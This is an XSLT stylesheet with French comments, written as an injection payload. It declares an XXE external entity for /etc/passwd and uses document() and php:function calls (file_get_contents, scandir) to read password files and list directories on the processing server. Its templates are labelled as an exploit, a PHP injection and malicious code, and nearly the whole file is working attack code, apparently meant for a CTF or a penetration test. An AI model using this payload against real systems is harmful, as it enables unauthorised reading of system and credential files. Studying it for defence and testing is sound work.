<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xsl:stylesheet [
  <!-- Tentative d'injection d'entité externe pour lire des fichiers -->
  <!ENTITY ext_file SYSTEM "file:///etc/passwd">
  <!ENTITY php_code SYSTEM "http://localhost/.passwd">
]>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl"
                version="1.0">
  
  <!-- Exploit XXE : Tenter de récupérer /etc/passwd -->
  <xsl:template match="/">
    <xsl:text>--- XXE EXPLOIT ---</xsl:text>
    <xsl:value-of select="document('file:///.passwd')"/>
    <xsl:value-of select="ext_file"/>
  </xsl:template>

  <!-- Injection PHP via fonction file_get_contents -->
  <xsl:template match="/php">
    <xsl:text>--- PHP INJECTION ---</xsl:text>
    <xsl:value-of select="php:function('file_get_contents','/.passwd')"/>
  </xsl:template>

  <!-- Affichage du fichier de style -->
  <xsl:template match="style">
    <xsl:value-of select="php:function('scandir','.')"/>
  </xsl:template>

  <!-- Affichage du résultat du fichier externe PHP -->
  <xsl:template match="/.passwd">
    <xsl:text>--- PHP MALICIOUS CODE ---</xsl:text>
    <xsl:value-of select="document('http://localhost/.passwd')"/>
  </xsl:template>
  
</xsl:stylesheet>
